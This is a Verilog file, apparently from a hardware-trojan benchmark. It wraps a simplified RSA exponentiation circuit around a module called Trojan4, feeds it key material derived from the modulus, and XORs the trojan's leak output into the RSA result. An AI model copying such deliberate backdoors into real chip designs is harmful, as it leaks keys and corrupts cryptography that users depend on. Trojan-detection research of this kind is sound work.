// RSA Host Circuit for Trojan4
// Fixed I/O to match Trojan4: clk, rst, key[63:0] -> leak[63:0]
module trojan4_rsa0_host #(
    parameter [127:0] PRIME_SEED = 128'h123456789ABCDEF0FEDCBA9876543210,
    parameter [15:0] TROJ_SECRET_KEY = 16'hDEAD
)(
    input wire clk,
    input wire rst,
    input wire [MODULUS_WIDTH-1:0] message,
    input wire [MODULUS_WIDTH-1:0] modulus,
    input wire [EXPONENT_WIDTH-1:0] exponent,
    input wire rsa_start,
    output reg [MODULUS_WIDTH-1:0] result,
    output reg rsa_done
);

    // Sizing parameters (converted from parameter to localparam)
    localparam MODULUS_WIDTH = 16;  // Reduced RSA modulus width
    localparam EXPONENT_WIDTH = 4;  // Reduced RSA exponent width

    // Trojan interface (fixed width)
    wire [63:0] trojan_key;
    wire [63:0] trojan_leak;
    
    // RSA computation state
    reg [MODULUS_WIDTH-1:0] accumulator;
    reg [MODULUS_WIDTH-1:0] base;
    reg [EXPONENT_WIDTH-1:0] exp_counter;
    reg rsa_active;
    
    // Key material for trojan
    reg [127:0] prime_gen;
    reg [63:0] key_material;
    reg [7:0] modular_counter;
    
    // Generate key material from RSA parameters
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            prime_gen <= PRIME_SEED;
            key_material <= 64'h0;
            modular_counter <= 8'h0;
        end else if (rsa_start || rsa_active) begin
            prime_gen <= {prime_gen[126:0], prime_gen[127] ^ prime_gen[95] ^ prime_gen[63] ^ prime_gen[31]};
            key_material <= {{(64-MODULUS_WIDTH){1'b0}}, modulus} ^ prime_gen[63:0];
            modular_counter <= modular_counter + 1;
        end
    end
    
    assign trojan_key = key_material;
    
    // RSA modular exponentiation state machine (simplified)
    // Output with trojan leak integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            accumulator <= {{MODULUS_WIDTH{1'b0}}};
            base <= {MODULUS_WIDTH{1'b0}};
            exp_counter <= {EXPONENT_WIDTH{1'b0}};
            rsa_active <= 1'b0;
            rsa_done <= 1'b0;
            result <= {MODULUS_WIDTH{1'b0}};
        end else begin
            if (rsa_start && !rsa_active) begin
                accumulator <= {{(MODULUS_WIDTH-1){1'b0}}, 1'b1}; // Start with 1
                base <= message;
                exp_counter <= exponent;
                rsa_active <= 1'b1;
                rsa_done <= 1'b0;
            end else if (rsa_active) begin
                if (exp_counter > {EXPONENT_WIDTH{1'b0}}) begin
                    // Square and multiply (simplified)
                    if (exp_counter[0]) begin
                        // Multiply step
                        accumulator <= (accumulator * base) % modulus;
                    end
                    // Square step
                    base <= (base * base) % modulus;
                    exp_counter <= exp_counter >> 1;
                end else begin
                    rsa_active <= 1'b0;
                    rsa_done <= 1'b1;
                    // Mix RSA result with trojan leak
                    result <= accumulator[MODULUS_WIDTH-1:0] ^ trojan_leak[MODULUS_WIDTH-1:0];
                end
            end else begin
                rsa_done <= 1'b0;
            end
        end
    end
    
    // Instantiate Trojan4
    Trojan4 #(
        .SECRET_KEY(TROJ_SECRET_KEY)
    ) trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .leak(trojan_leak)
    );

endmodule
